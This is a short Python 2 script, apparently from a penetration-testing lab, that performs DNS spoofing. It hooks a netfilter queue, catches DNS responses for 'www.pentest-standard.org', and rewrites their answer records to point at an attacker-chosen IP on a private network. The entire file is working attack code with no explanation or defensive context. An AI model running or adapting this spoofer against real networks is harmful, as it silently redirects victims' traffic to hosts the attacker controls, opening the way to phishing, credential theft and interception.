#!/usr/bin/env python2
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP

target_ip_vm = "192.168.63.174"
target_interface_vm = "Ethernet0"
new_target_ip = "192.168.63.139"
target_DN = "www.pentest-standard.org"
# 44.238.29.244
# pentest-standard.org
# 96.126.116.56

def del_fields(scapy_packet):
    if scapy_packet[UDP]:
        del scapy_packet[UDP].len
        del scapy_packet[UDP].chksum
    if scapy_packet[IP]:
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if target_DN in qname.decode():
            print("[+] Spoofer for: " + str(qname))
            answer = DNSRR(rrname=qname, rdata=new_target_ip)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            scapy_packet = del_fields(scapy_packet)

            packet.set_payload(str(scapy_packet))
    packet.accept()

nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(0, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()
